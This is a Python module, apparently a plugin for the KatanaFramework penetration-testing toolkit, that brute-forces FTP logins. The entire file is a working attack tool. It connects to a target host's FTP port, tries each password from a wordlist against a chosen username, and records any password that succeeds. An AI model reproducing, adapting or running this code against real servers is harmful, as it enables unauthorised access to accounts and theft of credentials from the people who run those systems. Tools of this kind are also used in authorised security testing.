# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KATANAFRAMEWORK import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES
from core.Function import isLive,saveRegister
from ftplib import FTP
# END LIBRARIES

# INFORMATION MODULE
def init():
	init.Author             ="LeSZO ZerO"
	init.Version            ="1.1"
	init.Description        ="Brute Force to FTP protocol."
	init.CodeName           ="btf/pr.ftp"
	init.DateCreation       ="07/03/2015"      
	init.LastModification   ="24/05/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE                RQ     DESCRIPTION
		'target':[LOCAL_IP            ,True ,'Host Target'],
		'port'  :[FTP_PORT            ,False,'Port Target'],
		'user'  :[USERNAME            ,True ,'Username target'],
		'dict'  :[DITIONARY_PASSWORDS ,False,'Wordlist']
	}
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	isLive(init.var['target'],init.var['port'])
	Loadingfile(init.var['dict'])

	ftp = FTP()
	ftp.connect(init.var['target'],int(init.var['port'])) 

	with open(init.var['dict'],'r') as passwords:
		for password in passwords:
			password=password.replace("\n","")
			try:
				ftp.login(init.var['user'],password)
				if True:
					printAlert(3,"Successfully with ["+init.var['user']+"]["+password+"]\n")
					Space()
					saveRegister(init,password)
					return
			except:printAlert(0," | Checking '"+password+"'")

# END CODE MODULE ############################################################################################